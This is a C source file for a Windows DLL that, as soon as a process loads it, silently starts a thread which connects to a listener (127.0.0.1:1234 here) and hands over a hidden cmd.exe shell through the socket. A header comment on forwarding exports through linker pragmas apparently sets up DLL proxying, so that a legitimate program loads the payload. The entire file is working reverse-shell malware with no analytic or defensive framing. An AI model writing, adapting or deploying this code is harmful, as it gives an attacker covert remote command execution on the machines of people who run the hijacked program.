#include "pch.h"
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib, "Ws2_32.lib")

/*
    ** Make sure to include the DLL that has the exported functions in the project directory or the build will fail
    ** Or instead, you can provide the full path to the DLL in the linker options using visual studio 2022
    ** compiler directives should look like this: #pragma comment(linker, "/export:exportedfunction=DLLName.exportedfunction")
*/

// Structure to pass to threads
typedef struct {
    SOCKET sock;
    HANDLE hRead;
    HANDLE hWrite;
} ThreadParams;

// Thread to forward data from socket to process input
DWORD WINAPI SocketToInputThread(LPVOID lpParam) {
    ThreadParams* params = (ThreadParams*)lpParam;
    char buffer[4096];
    DWORD bytesRead, bytesWritten;

    while (1) {
        // Receive data from socket
        int result = recv(params->sock, buffer, sizeof(buffer), 0);
        if (result <= 0) break;  // Connection closed or error

        // Write to process input
        if (!WriteFile(params->hWrite, buffer, result, &bytesWritten, NULL) || bytesWritten == 0) {
            break;
        }
    }

    return 0;
}

// Thread to forward data from process output to socket
DWORD WINAPI OutputToSocketThread(LPVOID lpParam) {
    ThreadParams* params = (ThreadParams*)lpParam;
    char buffer[4096];
    DWORD bytesRead;

    while (1) {
        // Read from process output
        if (!ReadFile(params->hRead, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0) {
            break;
        }

        // Send data to socket
        if (send(params->sock, buffer, bytesRead, 0) <= 0) {
            break;
        }
    }

    return 0;
}

// Main shell thread
DWORD WINAPI ShellThread(LPVOID lpParameter) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;

    HANDLE hChildStdinRd = NULL, hChildStdinWr = NULL;
    HANDLE hChildStdoutRd = NULL, hChildStdoutWr = NULL;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Prepare server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(1234);
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

    // Connect to listener
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Create pipes for child process
    sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;

        // Create pipe for child's stdin (input to the child)
        if (!CreatePipe(&hChildStdinRd, &hChildStdinWr, &sa, 0)) {
            closesocket(sock);
            WSACleanup();
            return 1;
        }

    // Create pipe for child's stdout (output from the child)
    if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &sa, 0)) {
        CloseHandle(hChildStdinRd);
        CloseHandle(hChildStdinWr);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Set up process startup info
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hChildStdinRd;
    si.hStdOutput = hChildStdoutWr;
    si.hStdError = hChildStdoutWr;

    // Launch hidden cmd.exe
    char cmd[] = "cmd.exe";
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hChildStdinRd);
        CloseHandle(hChildStdinWr);
        CloseHandle(hChildStdoutRd);
        CloseHandle(hChildStdoutWr);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Close pipe ends that the child process uses
    CloseHandle(hChildStdinRd);   // Child uses this for stdin
    CloseHandle(hChildStdoutWr);  // Child uses this for stdout

    // Prepare parameters for threads
    ThreadParams inputParams = { sock, NULL, hChildStdinWr };
    ThreadParams outputParams = { sock, hChildStdoutRd, NULL };

    // Create threads for I/O forwarding
    HANDLE hThreads[2];
    hThreads[0] = CreateThread(NULL, 0, SocketToInputThread, &inputParams, 0, NULL);
    hThreads[1] = CreateThread(NULL, 0, OutputToSocketThread, &outputParams, 0, NULL);

    // Wait for the process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    TerminateProcess(pi.hProcess, 0);

    // Close remaining handles
    CloseHandle(hChildStdinWr);
    CloseHandle(hChildStdoutRd);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    // Close socket and cleanup Winsock
    closesocket(sock);
    WSACleanup();

    // Wait for I/O threads to finish
    WaitForMultipleObjects(2, hThreads, TRUE, 2000);
    CloseHandle(hThreads[0]);
    CloseHandle(hThreads[1]);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, ShellThread, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}